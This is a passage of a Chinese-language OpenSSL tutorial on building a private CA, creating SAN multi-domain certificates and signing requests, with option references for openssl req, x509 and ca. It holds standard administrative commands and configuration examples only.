<span style="color: #b22222;"># </span><span style="color: #b22222;">openssl x509 -req -days 36500 -in req1.csr -signkey pri_key.pem -out fd.crt -extfile fd.ext</span>
Signature ok
<span style="color: #a0522d;">subject</span>=/C=CN/ST=Beijing/L=Beijing/O=DevOps/CN=tomcat.aiull.com
Getting Private key
Enter pass phrase for pri_key.pem:

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26816;&#26597;&#35777;&#20070;&#30340;&#26102;&#20505;&#20320;&#20250;&#21457;&#29616;&#23427;&#21253;&#25324;&#20102;SAN&#25193;&#23637;&#20449;&#24687;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">openssl x509 -in fd.crt -text -noout</span>
        X509v3 extensions:
            X509v3 Subject Alternative Name: 
                DNS:*.feistyduck.com, DNS:feistyduck.com, DNS:*.aiull.com, DNS:aiull.com
</pre>
</div>

<p>
范例：使用可选名称SAN扩展配置多域名证书
</p>

<div class="org-src-container">
<pre class="src src-sh">
<span style="color: #b22222;">#</span><span style="color: #b22222;">1 &#29983;&#25104;CA&#23494;&#38053;</span>
openssl genrsa -des3 -out ca.key 2048

<span style="color: #b22222;">#</span><span style="color: #b22222;">2 &#29983;&#25104;CA&#26681;&#35777;&#20070;</span>
openssl req -sha256 -new -x509 -days 365 -key ca.key -out ca.crt <span style="color: #8b2252;">\</span>
-subj <span style="color: #8b2252;">"/C=CN/ST=GD/L=SZ/O=lee/OU=study/CN=testRoot"</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">3 &#29983;&#25104;&#26381;&#21153;&#22120;&#23494;&#38053;</span>
openssl genrsa -des3 -out server.key 2048
<span style="color: #b22222;">#</span><span style="color: #b22222;">4 &#29983;&#25104;&#26381;&#21153;&#22120;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;</span>
openssl req -new <span style="color: #8b2252;">\</span>
-sha256 <span style="color: #8b2252;">\</span>
-key server.key <span style="color: #8b2252;">\</span>
-subj <span style="color: #8b2252;">"/C=CN/ST=GD/L=SZ/O=lee/OU=study/CN=bdstatic.com"</span> <span style="color: #8b2252;">\</span>
-reqexts SAN <span style="color: #8b2252;">\</span>
-config &lt;(cat /etc/pki/tls/openssl.cnf <span style="color: #8b2252;">\</span>
&lt;(<span style="color: #483d8b;">printf</span> <span style="color: #8b2252;">"[SAN]\nsubjectAltName=DNS:*.bdstatic.com,DNS:*.baidu.com"</span>)) <span style="color: #8b2252;">\</span>
-out server.csr

<span style="color: #b22222;">#</span><span style="color: #b22222;">5 CA&#31614;&#32626;&#26381;&#21153;&#22120;&#35777;&#20070;</span>
openssl ca -in server.csr <span style="color: #8b2252;">\</span>
-md sha256 <span style="color: #8b2252;">\</span>
-keyfile ca.key <span style="color: #8b2252;">\</span>
-cert ca.crt <span style="color: #8b2252;">\</span>
-extensions SAN <span style="color: #8b2252;">\</span>
-config &lt;(cat /etc/pki/tls/openssl.cnf <span style="color: #8b2252;">\</span>
&lt;(<span style="color: #483d8b;">printf</span> <span style="color: #8b2252;">"[SAN]\nsubjectAltName=DNS:*.bdstatic.com,DNS:*.baidu.com"</span>)) <span style="color: #8b2252;">\</span>
-out server.crt
</pre>
</div>

<p>
<b>openssl req 命令用法</b>
</p>

<pre class="example" id="orgdacfc0a">
openssl req [-new] [-newkey rsa:bits] [-verify] [-x509] [-in filename] [-out filename] [-key filename] [-passin arg] [-passout arg] 
[-keyout filename] [-pubkey] [-nodes] [-[dgst]] [-config filename] [-subj arg] [-days n] [-set_serial n] [-extensions section]
[-reqexts section] [-utf8] [-nameopt] [-reqopt] [-subject] [-subj arg] [-text] [-noout] [-batch] [-verbose]
 
选项说明：
-new        ：创建一个证书请求文件，会交互式提醒输入一些信息，这些交互选项以及交互选项信息的长度值以及其他一些扩展属性在配置文件(默认为
            ：openssl.cnf，还有些辅助配置文件)中指定了默认值。如果没有指定"-key"选项，则会自动生成一个RSA私钥，该私钥的生成位置
            ：也在openssl.cnf中指定了。如果指定了-x509选项，则表示创建的是自签署证书文件，而非证书请求文件
-newkey args：类似于"-new"选项，创建一个新的证书请求，并创建私钥。args的格式是"rsa:bits"(其他加密算法请查看man)，其中bits
            ：是rsa密钥的长度，如果bits省略了(即-newkey rsa)，则长度根据配置文件中default_bits指令的值作为默认长度，默认该值为2048
            ：如果指定了-x509选项，则表示创建的是自签署证书文件，而非证书请求文件
-nodes      ：默认情况下，openssl req自动创建私钥时都要求加密并提示输入加密密码，指定该选项后则禁止对私钥文件加密
-key filename    ：指定私钥的输入文件，创建证书请求时需要
-keyout filename ：指定自动创建私钥时私钥的存放位置，若未指定该选项，则使用配置文件中default_keyfile指定的值，默认该值为privkey.pem
-[dgst]          ：指定对创建请求时提供的申请者信息进行数字签名时的单向加密算法，如-md5/-sha1/-sha512等，
                 ：若未指定则默认使用配置文件中default_md指定的值
-verify       ：对证书请求文件进行数字签名验证
-x509         ：指定该选项时，将生成一个自签署证书，而不是创建证书请求。一般用于测试或者为根CA创建自签名证书
-days n       ：指定自签名证书的有效期限，默认30天，需要和"-x509"一起使用。
              ：注意是自签名证书期限，而非请求的证书期限，因为证书的有效期是颁发者指定的，证书请求者指定有效期是没有意义的，
              ：配置文件中的default_days指定了请求证书的有效期限，默认365天
-set_serial n ：指定生成自签名证书时的证书序列号，该序列号将写入配置文件中serial指定的文件中，这样就不需要手动更新该序列号文件
              ：支持数值和16进制值(0x开头)，虽然也支持负数，但不建议
-in filename  ：指定证书请求文件filename。注意，创建证书请求文件时是不需要指定该选项的
-out filename ：证书请求或自签署证书的输出文件，也可以是其他内容的输出文件，不指定时默认stdout
-subj args    ：替换或自定义证书请求时需要输入的信息，并输出修改后的请求信息。args的格式为"/type0=value0/type1=value1..."，
              ：如果value为空，则表示使用配置文件中指定的默认值，如果value值为"."，则表示该项留空。其中可识别type(man req)有：
              ：C是Country、ST是state、L是localcity、O是Organization、OU是Organization Unit、CN是common name等
-config  配置内容 或文件路径

【输出内容选项：】
-text         ：以文本格式打印证书请求
-noout        ：不输出部分信息
-subject      ：输出证书请求文件中的subject(如果指定了x509，则打印证书中的subject)
-pubkey       ：输出证书请求文件中的公钥

【配置文件项和杂项：】
-passin arg      ：传递解密密码
-passout arg     ：指定加密输出文件时的密码
-config filename ：指定req的配置文件，指定后将忽略所有的其他配置文件。如果不指定则默认使用/etc/pki/tls/openssl.cnf中req段落的值
-batch           ：非交互模式，直接从配置文件(默认/etc/pki/tls/openssl.cnf)中读取证书请求所需字段信息。但若不指定"-key"时，仍会询问key
-verbose         ：显示操作执行的详细信息
</pre>

<p>
以下则是配置文件中(默认/etc/pki/tls/openssl.cnf)关于req段落的配置格式
</p>

<pre class="example" id="orgd9e25f8">
input_password ：密码输入文件，和命令行的"-passin"选项对应，密码格式以及意义见"openssl密码格式"
output_password：密码的输出文件，与命令行的"-passout"选项对应，密码格式以及意义见"openssl密码格式"
default_bits   ：openssl req自动生成RSA私钥时的长度，不写时默认是512，建议不小于2048。命令行的"-new"和"-newkey"可能会用到它 
default_keyfile：默认的私钥输出文件，与命令行的"-keyout"选项对应 
encrypt_key    ：当设置为no时，自动创建私钥时不会加密该私钥。设置为no时与命令行的"-nodes"等价。还有等价的兼容性写法：encry_rsa_key 
default_md     ：指定创建证书请求时对申请者信息进行数字签名的单向加密算法，与命令行的"-[dgst]"对应 可以使用(sha256, sha3-256, sha512, sha3-512, ...)
prompt         ：当指定为no时，则不提示输入证书请求的字段信息，而是直接从openssl.cnf中读取 ：请小心设置该选项，很可能请求文件创建失败就是因为该选项设置为no 
string_mask    ：为一些字段设置默认的字符串类型，比如证书请求中的城市和组织名称。可能的取值和解释如下
  # default: 包含了 PrintableString, T61String, BMPString 三种类型
  # pkix  : 包含了 PrintableString, BMPString 两种类型
  # utf8only: 只使用 UTF8 字符串。推荐使用这个，这样可以完美的包含任意字符。
  # nombstr : 包含了 PrintableString, T61String 两种类型
distinguished_name：(DN)是一个扩展属性段落，用于指定证书请求时可被识别的字段名称。

#可被识别的字段名称包含了用户的标识信息，对应 -subj 命令行选项。如
[ req ]
# `man req`
default_bits        = 4096
distinguished_name  = req_distinguished_name
string_mask         = utf8only
default_md          = sha256
[ req_distinguished_name ]
countryName                    = Country Name (2 letter code)
stateOrProvinceName            = State or Province Name
localityName                   = Locality Name
organizationName             = Organization Name
organizationalUnitName         = Organizational Unit Name
commonName                     = Common Name
</pre>

<p>
以下是默认的配置文件格式及值。关于配置文件的详细分析见”配置文件”部分
</p>

<pre class="example" id="orgb1e95bc">
[ req ]
# `man req`
default_bits            = 2048
default_md              = sha1
default_keyfile         = privkey.pem
distinguished_name      = req_distinguished_name
attributes              = req_attributes
x509_extensions = v3_ca # The extentions to add to the self signed cert
string_mask = utf8only
[ req_distinguished_name ]
countryName                     = Country Name (2 letter code)
countryName_default             = XX
countryName_min                 = 2
countryName_max                 = 2
stateOrProvinceName             = State or Province Name (full name)
localityName                    = Locality Name (eg, city)
localityName_default    = Default City
0.organizationName              = Organization Name (eg, company)
0.organizationName_default      = Default Company Ltd
organizationalUnitName          = Organizational Unit Name (eg, section)
commonName                      = Common Name (eg, your name or your server\'s hostname)
commonName_max                  = 64
emailAddress                    = Email Address
emailAddress_max                = 64
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6ca0f19f-5446-4bae-be61-92404b88c2c9" class="outline-4">
<h4 id="h:6ca0f19f-5446-4bae-be61-92404b88c2c9">申请证书并颁发证书</h4>
<div class="outline-text-4" id="text-h:6ca0f19f-5446-4bae-be61-92404b88c2c9">
<p>
1、为需要使用证书的主机生成私钥
</p>

<div class="org-src-container">
<pre class="src src-sh">mkdir /data/app1
(<span style="color: #483d8b;">umask</span> 066; openssl genrsa -out /data/app1/app1.key 2048)
</pre>
</div>

<p>
2、为需要使用证书的主机生成证书申请文件
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl req -new -key /data/app1/app1.key -out /data/app1/app1.csr
</pre>
</div>

<p>
注意：
</p>
<ul class="org-ul">
<li>其中的subject信息部分，要与CA的保持一致；</li>
<li>Common Name要使用此主机在通信真实使用名字；</li>
<li>csr 在得到CA证书后可以保留可以删除</li>
</ul>

<p>
合并主机生成私钥和证书申请文件步骤， -newkey 选项自动创建私钥
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl req <span style="color: #8b2252;">\</span>
    -newkey rsa:4096 -nodes -sha256 -keyout /data/app1/app1.key <span style="color: #8b2252;">\</span>
    -out /data/app1/app1.csr <span style="color: #8b2252;">\</span>
    -subj <span style="color: #8b2252;">"/C=CN/ST=beijing/L=bj/O=ops/CN=app1.xcw.org"</span>
</pre>
</div>

<p>
3、在CA签署证书并将证书颁发给请求者
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl ca -in /data/app1/app1.csr  -out /etc/pki/CA/certs/app1.crt -days 36500
</pre>
</div>

<p>
注意：默认要求国家，省，公司名称三项必须和CA一致。这些是由配置文件中的
匹配策略决定的。
</p>

<div class="org-src-container">
<pre class="src src-sh">[ ca ]
default_ca      = CA_default            <span style="color: #b22222;"># </span><span style="color: #b22222;">The default ca section</span>
[ CA_default ]
policy          = policy_match
[ policy_match ]
countryName             = match
stateOrProvinceName     = match
organizationName        = match
organizationalUnitName  = optional
commonName              = supplied
emailAddress            = optional
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#19977;&#31181;&#31574;&#30053;&#65306;match&#21305;&#37197;&#12289;optional&#21487;&#36873;&#12289;supplied&#25552;&#20379; </span>
</pre>
</div>

<p>
也可以这样
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">x509&#20063;&#21487;&#20197;&#29992;&#26469;&#31614;&#32626;&#20182;&#20154;&#30340;&#35777;&#20070;&#35831;&#27714;&#65292;&#21363;&#20026;&#20182;&#20154;&#39041;&#21457;&#35777;&#20070;&#12290;&#27880;&#24847;&#65292;&#20026;&#20182;&#20154;&#39041;&#21457;&#35777;&#20070;&#26102;&#65292;&#30830;&#20445;serial&#25991;&#20214;&#23384;&#22312;&#65292;&#24314;&#35758;&#20351;&#29992;&#33258;&#21160;&#21019;&#24314;&#30340;&#36873;&#39033;"-CAcreateserial"&#12290;</span>
openssl x509 -req -days 36500 -in req.csr -CA ca.crt -CAkey ca.key -out x509.crt -CAcreateserial <span style="color: #b22222;"># </span><span style="color: #b22222;">&#29992;&#36825;&#20010;&#21487;&#20197;&#36991;&#20813;&#19968;&#20123;&#38169;&#35823;</span>
</pre>
</div>

<p>
4、查看证书中的信息：
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl x509 -in /PATH/FROM/CERT_FILE -noout -text|issuer|subject|serial|dates
&#35828;&#26126;&#65306;
-noout : &#36755;&#20986;
-serial : &#26597;&#30475;&#35777;&#20070;&#24207;&#21015;&#21495;
-subject : &#26597;&#30475;&#35777;&#20070;&#20027;&#39064;&#26631;&#35782;
-dates : &#36215;&#27490;&#26102;&#38388;
-issuer  : print issuer DN &#35841;&#31614;&#32626;&#30340;
-text : &#25991;&#26412;&#36755;&#20986;

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#25351;&#23450;&#32534;&#21495;&#30340;&#35777;&#20070;&#29366;&#24577;</span>
openssl ca -status SERIAL

[root@centos8 ~]#cat /etc/pki/CA/index.txt
V   231204234322Z       01  unknown /C=CN/ST=beijing/O=ops/OU=it/CN=app1.xcw.org

V&#65306;&#34920;&#31034;&#24050;&#32463;&#31614;&#32626;&#30340;
01&#65306;&#34920;&#31034;&#35777;&#20070;&#24207;&#21015;&#21495;
/C=CN/ST=Beijing/O=&#8230; ...&#65306;  &#34920;&#31034;&#20027;&#39064;&#20449;&#24687;(&#20027;&#39064;&#26631;&#35782;)
</pre>
</div>
</div>
<div id="outline-container-h:74428868-4e7d-4c09-a49a-5934cbb63fbb" class="outline-5">
<h5 id="h:74428868-4e7d-4c09-a49a-5934cbb63fbb">openssl ca (签署和自建CA)</h5>
<div class="outline-text-5" id="text-h:74428868-4e7d-4c09-a49a-5934cbb63fbb">
<p>
经过上面的示例，应该对openssl ca命令的用法大致了解了，下面是其完整的用
法说明，不包括crl相关功能。
</p>

<p>
要注意，ca命令是用于签署证书的，所以它所需要的文件除了配置文件外就是私
钥文件和证书请求文件，而签名后生成的文件是证书文件，因此使用”-in”指
定的对象是待签署文件，"-infiles"则是指定多个待签署文件，"-keyfile"是指
定私钥文件，"-out"是指定输出的证书文件。
</p>

<div class="org-src-container">
<pre class="src src-sh">openssl ca [-verbose] [-config filename] [-name section] [-startdate date] [-enddate date] [-days arg] [-md arg] [-policy arg] [-keyfile arg] [-key arg] [-passin arg] [-cert file]
[-selfsign] [-in file] [-out file] [-notext] [-outdir dir] [-infiles] [-ss_cert file] [-preserveDN] [-noemailDN] [-batch] [-extensions section] [-extfile section] [-subj arg] [-utf8]
&#12304;&#36873;&#39033;&#35828;&#26126;&#65306;&#12305;
-config filename &#65306;&#25351;&#23450;&#35201;&#20351;&#29992;&#30340;&#37197;&#32622;&#25991;&#20214;&#65292;&#25351;&#23450;&#21518;&#23558;&#24573;&#30053;openssl.cnf&#20013;&#25351;&#23450;&#30340;&#20851;&#20110;ca&#30340;&#37197;&#32622;&#36873;&#39033;&#12290;
-name section    &#65306;&#25351;&#23450;&#20351;&#29992;&#37197;&#32622;&#25991;&#20214;&#20013;&#30340;&#37027;&#20010;section&#12290;&#25351;&#23450;&#21518;&#23558;&#24573;&#30053;openssl.cnf&#20013;&#30340;default_ca&#27573;&#12290;
-in filename     &#65306;&#25351;&#23450;&#35201;&#34987;CA&#31614;&#32626;&#30340;&#21333;&#20010;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#12290;&#26681;CA&#20026;&#20854;&#20182;&#35777;&#20070;&#31614;&#32626;&#26102;&#20351;&#29992;&#12290;
-infiles         &#65306;&#35813;&#36873;&#39033;&#21482;&#33021;&#26159;&#26368;&#21518;&#19968;&#20010;&#36873;&#39033;&#65292;&#35813;&#36873;&#39033;&#25152;&#25509;&#30340;&#25152;&#26377;&#21442;&#25968;&#37117;&#34987;&#35748;&#20026;&#26159;&#35201;&#34987;&#31614;&#32626;&#30340;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#65292;&#21363;&#19968;&#27425;&#24615;&#31614;&#32626;&#22810;&#20010;&#35831;&#27714;&#25991;&#20214;&#26102;&#20351;&#29992;&#30340;&#36873;&#39033;&#12290;
-selfsign        &#65306;&#33258;&#31614;&#32626;&#12290;&#25351;&#23450;-ss_cert&#36873;&#39033;&#26102;&#35813;&#36873;&#39033;&#34987;&#24573;&#30053;&#12290;
-ss_cert filename&#65306;&#23558;&#34987;CA&#33258;&#31614;&#32626;&#30340;&#21333;&#20010;&#35777;&#20070;&#25991;&#20214;&#12290;&#20063;&#23601;&#26159;&#35828;&#35201;&#37325;&#26032;&#31614;&#32626;&#35777;&#20070;&#12290;
-out filename    &#65306;&#35777;&#20070;&#30340;&#36755;&#20986;&#25991;&#20214;&#65292;&#21516;&#26102;&#20063;&#20250;&#36755;&#20986;&#21040;&#23631;&#24149;&#12290;&#19981;&#25351;&#23450;&#26102;&#40664;&#35748;&#36755;&#20986;&#21040;stdout&#12290;
-outdir dir_name &#65306;&#35777;&#20070;&#30340;&#36755;&#20986;&#30446;&#24405;&#12290;&#25351;&#23450;&#35813;&#36873;&#39033;&#26102;&#65292;&#23558;&#33258;&#21160;&#22312;&#27492;&#30446;&#24405;&#19979;&#29983;&#25104;&#19968;&#20010;&#25991;&#20214;&#21517;&#21253;&#21547;16&#36827;&#21046;serial&#20540;&#30340;<span style="color: #8b2252;">".pem"</span>&#35777;&#20070;&#25991;&#20214;&#12290;
-cert            &#65306;CA&#33258;&#24049;&#30340;&#35777;&#20070;&#25991;&#20214;&#12290;
-keyfile filename&#65306;&#25351;&#23450;&#31614;&#32626;&#35777;&#20070;&#35831;&#27714;&#26102;&#30340;&#31169;&#38053;&#25991;&#20214;&#65292;&#21363;CA&#33258;&#24049;&#30340;&#31169;&#38053;&#25991;&#20214;&#12290;
-key passwd_value&#65306;&#25351;&#23450;&#31169;&#38053;&#30340;&#21152;&#23494;&#23494;&#30721;&#12290;
-passin arg      &#65306;&#20256;&#36882;&#35299;&#23494;&#23494;&#30721;
-verbose         &#65306;&#25171;&#21360;&#25805;&#20316;&#25191;&#34892;&#26102;&#30340;&#35814;&#32454;&#20449;&#24687;
-notext          &#65306;&#31105;&#27490;&#20197;&#25991;&#26412;&#26684;&#24335;&#23558;&#35777;&#20070;&#36755;&#20986;&#21040;<span style="color: #8b2252;">"-out"</span>&#25351;&#23450;&#30340;&#25991;&#20214;&#20013;
-days arg        &#65306;&#35777;&#20070;&#26377;&#25928;&#26399;&#38480;&#65292;&#20174;&#21019;&#24314;&#26102;&#21051;&#24320;&#22987;&#31639;startdate&#65292;&#26377;&#25928;&#26399;&#32467;&#26463;&#28857;&#20026;enddate&#12290;
-startdate       &#65306;&#33258;&#23450;&#20041;&#35777;&#20070;&#30340;&#24320;&#22987;&#26102;&#38388;&#65292;&#21644;<span style="color: #8b2252;">"-enddate"</span>&#19968;&#36215;&#20351;&#29992;&#21487;&#20197;&#25512;&#31639;&#20986;&#35777;&#20070;&#26377;&#25928;&#26399;&#12290;
-enddate         &#65306;&#33258;&#23450;&#20041;&#35777;&#20070;&#30340;&#32467;&#26463;&#26102;&#38388;&#12290;
-md alg          &#65306;&#25351;&#23450;&#21333;&#21521;&#21152;&#23494;&#31639;&#27861;
-policy arg      &#65306;&#35813;&#36873;&#39033;&#26159;&#37197;&#32622;&#25991;&#20214;&#20013;&#30340;section&#20869;&#23481;&#65292;&#35813;&#36873;&#39033;&#25351;&#23450;&#20102;&#35777;&#20070;&#20449;&#24687;&#20013;&#30340;field&#37096;&#20998;&#26159;&#21542;&#38656;&#35201;&#24378;&#21046;&#25552;&#20379;&#36824;&#26159;&#35201;&#24378;&#21046;&#21305;&#37197;&#65292;
                 &#65306;&#25110;&#32773;&#21487;&#25552;&#20379;&#21487;&#19981;&#25552;&#20379;&#12290;&#35814;&#32454;&#30340;&#35265;&#37197;&#32622;&#25991;&#20214;&#35828;&#26126;&#12290;
-extensions section&#65306;&#25351;&#23450;&#24403;&#21069;&#21019;&#24314;&#30340;&#35777;&#20070;&#20351;&#29992;&#37197;&#32622;&#25991;&#20214;&#20013;&#30340;&#21738;&#20010;section&#20316;&#20026;&#25193;&#23637;&#23646;&#24615;&#12290;
-batch           &#65306;&#31614;&#32626;&#26102;&#20351;&#29992;&#25209;&#22788;&#29702;&#27169;&#24335;&#65292;&#21363;&#38750;&#20132;&#20114;&#27169;&#24335;&#12290;&#35813;&#27169;&#24335;&#19979;&#19981;&#20250;&#26377;&#20004;&#27425;&#35810;&#38382;(&#26159;&#21542;&#31614;&#32626;&#12289;&#26159;&#21542;&#25552;&#20132;)&#12290;
-subj arg        &#65306;&#26367;&#25442;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;subject&#65292;&#26684;&#24335;/type0=value0/type1=value1/type2=...

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#37197;&#32622;&#25991;&#20214;&#20851;&#20110;ca&#30340;&#37096;&#20998;&#65292;&#20854;&#20013;&#34987;&#26631;&#35760;&#20026;&#24517;&#39035;&#39033;&#30340;&#34920;&#31034;&#37197;&#32622;&#25991;&#20214;&#20013;&#25110;&#32773;&#21629;&#20196;&#34892;&#20013;&#24517;&#39035;&#32473;&#20986;&#35813;&#36873;&#39033;&#21450;&#20854;&#20540;</span>
new_certs_dir    &#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-outdir"</span>&#36873;&#39033;&#12290;&#24517;&#39035;&#39033;
certificat       &#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-cert"</span>&#36873;&#39033;&#65292;CA&#33258;&#24049;&#30340;&#35777;&#20070;&#25991;&#20214;&#12290;&#24517;&#39035;&#39033;
private_key      &#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-keyfile"</span>&#36873;&#39033;&#65292;&#31614;&#32626;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#26102;&#30340;&#31169;&#38053;&#25991;&#20214;&#65292;&#21363;CA&#33258;&#24049;&#30340;&#31169;&#38053;&#25991;&#20214;&#12290;&#24517;&#39035;&#39033;
default_days     &#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-days"</span>&#36873;&#39033;
default_startdate&#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-startdate"</span>&#36873;&#39033;&#12290;
default_enddate  &#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-enddate"</span>&#36873;&#39033;&#12290;
default_md       &#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-md"</span>&#36873;&#39033;&#12290;&#24517;&#39035;&#39033;
database         &#65306;openssl&#32500;&#25252;&#30340;&#25968;&#25454;&#24211;&#25991;&#20214;&#12290;&#23384;&#25918;&#35777;&#20070;&#26465;&#30446;&#20449;&#24687;&#21450;&#29366;&#24577;&#20449;&#24687;&#12290;&#24517;&#39035;&#39033;
serial           &#65306;&#24050;&#39041;&#21457;&#35777;&#20070;&#30340;&#24207;&#21015;&#21495;(16&#36827;&#21046;)&#25991;&#20214;&#12290;&#24517;&#39035;&#39033;&#19988;&#35813;&#25991;&#20214;&#20013;&#24517;&#39035;&#23384;&#22312;&#19968;&#20010;&#24207;&#21015;&#20540;
unique_subject   &#65306;&#22914;&#26524;&#35774;&#32622;&#20026;yes&#65292;database&#20013;&#30340;subject&#21015;&#20540;&#24517;&#39035;&#19981;&#37325;&#22797;&#12290;&#22914;&#26524;&#35774;&#32622;&#20026;no&#65292;&#20801;&#35768;subject&#37325;&#22797;&#12290;&#40664;&#35748;&#26159;yes&#65292;
                 &#65306;&#36825;&#26159;&#20026;&#20102;&#20860;&#23481;&#32769;&#29256;&#26412;&#30340;Openssl&#65292;&#25512;&#33616;&#35774;&#32622;&#20026;no&#12290;
x509_extensions  &#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-extensions"</span>&#36873;&#39033;&#12290;
policy           &#65306;&#31561;&#21516;&#20110;<span style="color: #8b2252;">"-policy"</span>&#36873;&#39033;&#12290;&#24517;&#39035;&#39033;
name_opt/cert_opt&#65306;&#35777;&#20070;&#30340;&#23637;&#31034;&#26684;&#24335;&#65292;&#34429;&#38750;&#24517;&#39035;&#20294;&#24314;&#35758;&#35774;&#32622;&#20026;ca_default&#65292;&#33509;&#19981;&#35774;&#32622;&#23558;&#40664;&#35748;&#20351;&#29992;&#32769;&#29256;&#26412;&#30340;&#35777;&#20070;&#26684;&#24335;(&#19981;&#24314;&#35758;&#22914;&#27492;)&#12290;
                 &#65306;&#20266;&#21629;&#20196;ca&#26080;&#27861;&#30452;&#25509;&#35774;&#32622;&#36825;&#20004;&#20010;&#36873;&#39033;&#65292;&#32780;&#20266;&#21629;&#20196;x509&#30340;<span style="color: #8b2252;">"-nameopt"</span>&#21644;<span style="color: #8b2252;">"-certopt"</span>&#36873;&#39033;&#21487;&#20197;&#20998;&#21035;&#35774;&#32622;&#12290;
copy_extensions  &#65306;&#20915;&#23450;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#25193;&#23637;&#39033;&#22914;&#20309;&#22788;&#29702;&#30340;&#12290;&#22914;&#26524;&#35774;&#32622;&#20026;none&#25110;&#19981;&#20889;&#35813;&#36873;&#39033;&#65292;&#21017;&#25193;&#23637;&#39033;&#34987;&#24573;&#30053;&#24182;&#19988;&#19981;&#22797;&#21046;&#21040;&#35777;&#20070;&#20013;&#21435;&#12290;
                 &#65306;&#22914;&#26524;&#35774;&#32622;&#20026;copy&#65292;&#21017;&#35777;&#20070;&#35831;&#27714;&#20013;&#24050;&#23384;&#22312;&#32780;&#35777;&#20070;&#20013;&#19981;&#23384;&#22312;&#30340;&#25193;&#23637;&#39033;&#23558;&#22797;&#21046;&#21040;&#35777;&#20070;&#20013;&#12290;
                 &#65306;&#22914;&#26524;&#35774;&#32622;&#20026;copyall&#65292;&#21017;&#35777;&#20070;&#35831;&#27714;&#20013;&#25152;&#26377;&#30340;&#25193;&#23637;&#39033;&#37117;&#22797;&#21046;&#21040;&#35777;&#20070;&#20013;&#65292;&#27492;&#26102;&#33509;&#35777;&#20070;&#20013;&#24050;&#23384;&#22312;&#26576;&#25193;&#23637;&#39033;&#65292;&#21017;&#20808;&#21024;&#38500;&#20877;&#22797;&#21046;&#12290;
                 &#65306;&#35813;&#36873;&#39033;&#30340;&#20027;&#35201;&#20316;&#29992;&#26159;&#20801;&#35768;&#35777;&#20070;&#35831;&#27714;&#20026;&#29305;&#23450;&#30340;&#25193;&#23637;&#39033;&#22914;subjectAltName&#25552;&#20379;&#20540;&#12290;
                 &#65306;&#20351;&#29992;&#35813;&#36873;&#39033;&#21069;&#35831;&#20808;&#26597;&#30475;man ca&#20013;&#30340;WARNINGS&#37096;&#20998;&#12290;&#24314;&#35758;&#19968;&#33324;&#31616;&#21333;&#20351;&#29992;&#26102;&#35774;&#32622;&#20026;none&#25110;&#19981;&#35774;&#32622;&#12290;
</pre>
</div>

<p>
范例: 脚本自定义CA 签署证书函数
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a020f0;">function</span> <span style="color: #0000ff;">openssl_sign</span>() {
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"Generating ${3}/${4}.crt"</span>
    openssl ca -batch -config openssl.conf -extensions $<span style="color: #a0522d;">5</span> -days 3650 -notext <span style="color: #8b2252;">\</span>
        -md sha256 -in ${<span style="color: #a0522d;">3</span>}/${<span style="color: #a0522d;">4</span>}.csr -out ${<span style="color: #a0522d;">3</span>}/${<span style="color: #a0522d;">4</span>}.crt <span style="color: #8b2252;">\</span>
        -cert ${<span style="color: #a0522d;">1</span>} -keyfile ${<span style="color: #a0522d;">2</span>}

<span style="color: #b22222;"># </span><span style="color: #b22222;">-batch         &#65306;&#21462;&#28040;&#21629;&#20196;&#25552;&#31034;&#12290;&#38750;&#20132;&#20114;&#27169;&#24335;&#19979;&#19981;&#20250;&#26377;&#20004;&#27425;&#35810;&#38382;(&#26159;&#21542;&#31614;&#32626;&#12289;&#26159;&#21542;&#25552;&#20132;)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-extensions    &#65306;&#35777;&#20070;&#25193;&#23637;&#39033;&#65292;&#35774;&#32622;&#30340;&#25193;&#23637;&#39033;&#20248;&#20808;&#20110;&#37197;&#32622;&#25991;&#20214;&#25351;&#23450;&#30340;&#25193;&#23637;&#39033;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-notext        &#65306;&#21462;&#28040;&#35777;&#20070;&#30340;&#36755;&#20986;&#26174;&#31034;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-md sha256     &#65306;&#25351;&#23450;&#21333;&#21521;&#21152;&#23494;&#31639;&#27861;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-in file       &#65306;&#25351;&#23450;&#35201;&#34987;CA&#31614;&#32626;&#30340;&#21333;&#20010;&#35777;&#20070;&#35831;&#27714;&#25991;&#20214;&#12290;&#26681;CA&#20026;&#20854;&#20182;&#35777;&#20070;&#31614;&#32626;&#26102;&#20351;&#29992;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">-out file      &#65306;&#35777;&#20070;&#30340;&#36755;&#20986;&#25991;&#20214;&#65292;&#21516;&#26102;&#20063;&#20250;&#36755;&#20986;&#21040;&#23631;&#24149;&#12290;&#19981;&#25351;&#23450;&#26102;&#40664;&#35748;&#36755;&#20986;&#21040;stdout&#12290;</span>
